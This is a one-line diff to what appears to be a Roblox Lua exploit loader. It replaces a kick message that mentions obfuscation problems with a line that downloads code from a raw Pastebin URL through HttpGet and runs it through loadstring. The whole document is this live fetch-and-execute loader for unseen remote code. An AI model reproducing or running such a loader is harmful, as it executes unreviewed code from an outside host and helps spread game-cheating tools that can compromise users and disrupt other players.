@@ -1,1 +1,1 @@
-game.Players.LocalPlayer:Kick("Loadstring updated beacuse of obfuscation problems")
+loadstring(game:HttpGet("https://pastebin.com/raw/TFyX1vtB",true))()
